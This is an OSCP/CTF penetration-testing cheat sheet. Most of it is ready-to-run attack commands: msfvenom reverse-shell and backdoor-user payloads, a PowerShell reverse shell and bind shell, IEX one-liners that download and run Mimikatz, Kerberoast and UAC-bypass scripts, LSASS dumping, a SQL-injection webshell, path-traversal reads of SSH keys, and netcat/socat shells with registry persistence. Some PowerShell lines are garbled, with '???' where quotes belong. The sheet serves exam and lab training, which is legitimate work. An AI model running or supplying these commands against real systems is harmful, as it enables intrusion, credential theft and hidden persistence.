

# OSCP / CTF

OTHER RESSOURCES
```
https://github.com/R0B1NL1N/OSCP-note
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
https://gtfobins.github.io/#%20+SUID
https://book.hacktricks.xyz/linux-hardening/privilege-escalation
https://github.com/CountablyInfinite/oscp_cheatsheet
https://www.buaq.net/go-98074.html
https://blog.adithyanak.com/oscp-preparation-guide
https://ippsec.rocks/?#
https://medium.com/@GromHacks/guide-to-the-2022-oscp-exam-on-m1-with-active-directory-d8b4ce30f4f3
```

GENERAL EXPLOITS
```bash
Windows Server 2008 - MS09_050
Alternatively, since the target machine is running Windows Server 2008 sp1 32-bit, we could use the ms09_050_smb2_negotiate_func_index1 Metasploit Framework module.
```

FLAGS
```bash
"c:\\users\\administrator\\desktop\\proof.txt"
```

ENUM
```bash
#Portscan all Ports
nmap -sS -p- <ip>

#Portscan with Scripts and Fingerprinting
nmap -sS -sV -sC -p22,80,9000 <ip>

#nmap full and save out
nmap -sC -sV -p- -oA nmap/<box> 10.10.10.84

#Web Vuln-Scan
nikto -host 192.168.56.205

#web enum brute
dirb http://www.site.com -r -z 10

#Web Enum BruteForce
gobuster -t 100 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<host>
https://github.com/danielmiessler/SecLists
#big wordlist:
https://github.com/swisskyrepo/PayloadsAllTheThings
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/dirsearch.txt
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
gobuster -t 100 dir -w big.txt -u http://<host>
  
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://<ip>/FUZZ -t 500
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://<ip>/config/FUZZ -t 500 -mc 200

#curl brute / fuzz manual
while read line; do echo $line ; curl -s "http://10.10.11.154/index.php?page=/../../../..${line}"; done < fdbrute.txt

#ENUM processes
for i in {445..5000}; do echo $i >> procinfos.txt ;  curl -s "http://10.10.11.154/index.php?page=/../../../../proc/${i}/status" | wc -c >> procinfos.txt; done

#curl wordcount
curl -s "http://10.10.11.154/index.php?page=/../../../../proc/445/status" | wc -c

# bash number iterate
for i in {1000..5000}; do echo $i; curl -s "http://10.10.11.154/index.php?page=/../../../../proc/${i}/cmdline"; done

# bash iterate list
while read line; do echo $line ; curl -v "http://10.10.11.154/index.php?page=/../../../home/${line}/.ssh/id_rsa"; done < users.txt
while read line; do echo $line ; curl -v "http://10.10.11.154/index.php?page=/../../../home/${line}/.bash_history"; done < users.txt

# processes
ps auxwww

# POST-EXPLOITATION Discovery 
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
ipconfig /all
systeminfo
net config workstation
nltest /domain_trusts
nltest /domain_trusts /all_trusts
net view /all /domain
net view /all
net group "Domain Admins" /domain

```

EXPLOIT
```bash
#CVE / Exploit Search
searchsploit <name>
searchsploit -p <id>
cp <path> .

#Fuzzing 
python -c 'print("A" * 5000)' | nc <ip> <port>
  
#php shell command
"<?php system('id'); ?>"

#upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

#MSFVENOM

#MULTIHANDLER
msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/meterpreter/reverse_tcp; exploit"

./msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set lhost 192.168.1.123
lhost => 192.168.1.123
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > run

#java
msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.214 LPORT=445 -f war > /home/kali/Desktop/shell.war

#linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.10.2 LPORT=666 -f elf > /tmp/reverse_shell.elf
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.10.2 LPORT=666 -f elf > /tmp/reverse_shell.elf

#windows
msfvenom -p windows/meterpreter/reverse_https LHOST=172.28.23.16 LPORT=443 -e x86/shikata_ga_nai -i 5 -f dll > shellcode.dll

#php
msfvenom -p php/meterpreter/reverse_tcp -f raw lhost=192.168.1.43 lport=4050 > /var/www/shell.txt

#python
msfvenom -p python/meterpreter/reverse_tcp LHOST = ANYIP LPORT= ANY PORT R> anyname.py

#c++
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c > meterpreter.c

#msi
msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
msiexec /quiet /qn /i C:\evil.msi

#reverse-shell x64 windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.45 LPORT=8888 -f c -b \x00\x0a\x0d

#messagebox
msfvenom -p windows/x64/messagebox TEXT=CoreThreat TITLE=PWN -f raw -o SHELLCODE_MESSAGE_BOX.bin

```

PRIVESC
```bash
# Tools / Script
https://www.securitysift.com/download/linuxprivchecker.py

#Cron
sudo -l
crontab -l
cat /etc/crontab

#su sudo
su root
sudo su
passwd root
su

#SUID BINARY
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null

#Crack Password with John
unshadow passwd.txt shadow.txt > unshadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt

#Print files with the line number where the string is found
grep -rnw '/' -ie 'password' --color=always

#Find files with SUID permission
find / -perm -4000 -type f 2>/dev/null

#Find files with open permissions
find / -perm -777 -type f 2>/dev/null

#Find files with SUID permission for current user
    find / perm /u=s -user `whoami` 2>/dev/null
    find / -user root -perm -4000 -print 2>/dev/null

#Find files with writable permission for current user or current group
    find / perm /u=w -user `whoami` 2>/dev/null
    find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
    find / -perm /u+w -user `whoami` 2>/dev/nul

#Find directories with writable permissions for current user or current group
    find / perm /u=w -type -d -user `whoami` 2>/dev/null
    find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
    
#Post Exploit Enumeration
    grep -rnw '/' -ie 'pass' --color=always
    grep -rnw '/' -ie 'DB_PASS' --color=always
    grep -rnw '/' -ie 'DB_PASSWORD' --color=always
    grep -rnw '/' -ie 'DB_USER' --color=always

#lsass minidump com
"rundll32 C:\windows\system32\comsvcs.dll MiniDump "1234 dump.bin full""
rundll32.exe  comsvcs.dll,#24 600 C:\Users\user\Desktop\lsass.dmp full

#nanodump lsass
https://github.com/helpsystems/nanodump

#load pe in memory avoid av edr detection
https://github.com/D1rkMtr/FilelessRemotePE

# mimikatz param
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
```

FILETRANSFER
```bash
#File Upload on linux systems via base64 encoding
#Converting a file to base64:
cat file2upload | base64

#Once the file is converted to base64, you can just create a new file on the remote system and copy the base64 output of the above file into it. Next step would be to reverse the base64 to binary
cat fileWithBase64Content | base64 -d > finalBinary

bitsadmin /transfer evil.exe /download /priority high https://wslab.de/tools/nc.exe %temp%\evil.exe & start /wait %temp%\evil.exe -l -p 3333 -e cmd & del %temp%\evil.exe

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Deskto p\wget.exe')"

sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
```

POWERSHELL
```bash

# execution policy
Set-ExecutionPolicy Unrestricted
Get-ExecutionPolicy

# PS REVERSESHELL
sudo nc -lnvp 443
#reverseshell
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443); $stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush(); }
$client.Close();

#oneliner
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream =
$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-
String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush();}$client.Close()"


# BIND SHELL
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client =
$listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback =
(iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush()};$client.Close();$listener.Stop()"


# Description: 
#    Collection of PowerShell one-liners for red teamers and penetration testers to use at various stages of testing.

# Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

# Invoke-Mimikatz: Dump credentials from memory
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

# Import Mimikatz Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"

# Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"

# PowerUp: Privilege escalation checks
powershell.exe -exec Bypass -C ???IEX (New-Object Net.WebClient).DownloadString(???https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1???);Invoke-AllChecks???

# Invoke-Inveigh and log output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y ???NBNS Y ???mDNS Y  ???Proxy Y -LogOutput Y -FileOutput Y"

# Invoke-Kerberoast and provide Hashcat compatible hashes
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"

# Invoke-ShareFinder and print output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

# Import PowerView Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"

# Invoke-Bloodhound
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"

# Find GPP Passwords in SYSVOL
findstr /S cpassword $env:logonserver\sysvol\*.xml
findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)

# Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]
runas /user:DOMAIN\USER /noprofile powershell.exe

# Insert reg key to enable Wdigest on newer versions of Windows
reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1
```


REVERSESHELLS
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,se
```

ENCODING/DECODING
```bash
#bash urlencode
echo $( php -r "echo urlencode('Start: #1, Zeichen {13/24} Ende();');"; )
#!/bin/bash
echo $( php -r "echo urlencode(\"$1\");"; )
urlencode.sh 'string zum encodieren'
```

PHP
```bash
#build in webserver
php -S 0.0.0.0:8000

# create sqli to php webshell
http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

Busybox
```bash
busybox httpd -f -p 10000
```

LFI
```bash
http://10.10.0.22/menu.php?file=data:text/plain,hello world
http://10.10.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

SQLI
```bash
sqlmap -u http://10.10.0.22/debug.php?id=1 -p "id"
sqlmap -u http://10.10.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump
```

MARIADB SQLi
```bash
http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
```

POSTGRES
```bash
$ psql -h 192.168.147.47 -U postgres -p 5437
```

PERSISTENCE
```bash
# netcat run registry
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ /v hiddenbackdoor /d "C:\Program Files (x86)\Nmap\ncat.exe -lnp 4445 -e cmd.exe"
netsh advfirewall firewall add rule name="hiddenbackdoor" dir=in action=allow protocol=TCP localport=4445
```

SOCAT STUFF
```bash
# socat forwarder
socat TCP-LISTEN:80,fork TCP:202.54.1.5:80

# socat syslog server
socat -u udp4-listen:514,bind=192.0.2.10, open:/tmp/syslog,create,append

# forwarding
socat TCP4-LISTEN:8080 TCP4:123.456.789.12:80
socat TCP-LISTEN:8088,fork TCP:127.0.0.1:80

# minimal forward proxy
socat TCP-LISTEN:8443,fork TCP:corethreat.net:443

# encrypted shell
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
cat bind_shell.key bind_shell.crt > bind_shell.pem
sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
socat - OPENSSL:10.11.0.4:443,verify=0

# send file
sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
socat TCP4:10.10.0.1:443 file:received_secret_passwords.txt,create

# reverse shell
socat TCP4:10.10.0.22:443 EXEC:/bin/bash
```


NETCAT STUFF
```bash
# netcat stuff
Netcat-Forwarding
nc [host] [port] > relay.bat # forwarding

nc -l -p [port] -e relay.bat # forwarding

Netcat-Forwarding
nc -l -p [port] 0 (less than) backpipe (pipe) nc [client IP] [port] (pipe) tee backpipe

Netcat-Filetransfer
nc [host] [port] (greater than) file_name.out # send a file

nc [host] [port] (less than) file_name.in # receive a file

Netcat-Port-Scanner
nc -zv site.com 80 # scan port

nc -zv hostname.com 80 84 # scan ports
nc -zv site.com 80-84 # scan ports
nc -nvv -w 1 -z 10.11.1.220 3388-3390
nc -nv -u -z -w 1 10.11.1.115 160-162


Netcat-Banner
echo "" | nc -zv -wl [host] [port range] grab banner

Netcat-Backdoor-Shells
nc -l -p [port] -e /bin/bash
nc -l -p [port] -e cmd.exe
```

BASH, SETUP and Prep Stuff
```
# vim visual mode
vim disable visual mode
:set mouse-=a

one-liner
echo "set mouse-=a" >> ~/.vimrc 
echo "syntax on" >> ~/.vimrc 

```

BASH SCRIPTING - LOOPS
```bash
# for-loop
for ip in $(seq 1 10); do echo 10.11.1.$ip; done
for url in $(cat list.txt); do host $url; done
for url in $(cat list.txt); do host $url; done | grep "has address" | cut -d " " -f 4 | sort -u

# while-loop read from file
while read line; do echo $line ; done < tmp.txt
```

SMTP (Port 25)
```
nc -nv 10.11.1.217 25
VRFY root
```

SNMP (Port 161)
```
snmp-check 192.168.120.94
snmpwalk -c public -v1 -t 10 10.11.1.14

# enum user
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25

# enum windows process
snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2

# enum open ports
snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3

# enum installed sw
snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
```

FTP
```
# show hidden files
ls -lisah 

# download multiply files
prompt
mget *.*
```



DNS (Port 53)
```
host www.site.com
host -t mx www.site.com
host -t txt www.site.com

# brute force
for ip in $(cat list.txt); do host $ip.site.com; done

# zone transfer
host -l site.com ns1.site.com
```

SMB (Port 138, 139, 445)
```
smbmap -H 192.168.52.43
smbclient -L <ip>

smbclient -L 192.168.1.40
smbclient //192.168.1.40/guest
get file.txt

smbclient -L //192.168.52.43/HELPDESK --user HELPDESK/admin

```

REFS
```
https://github.com/swisskyrepo/PayloadsAllTheThings
```

Active Directory
```
[https://github.com/swisskyrepo/PayloadsAllTheThings](https://0xdarkvortex.dev/active-directory-penetration-dojo-ad-environment-enumeration-1/)
```

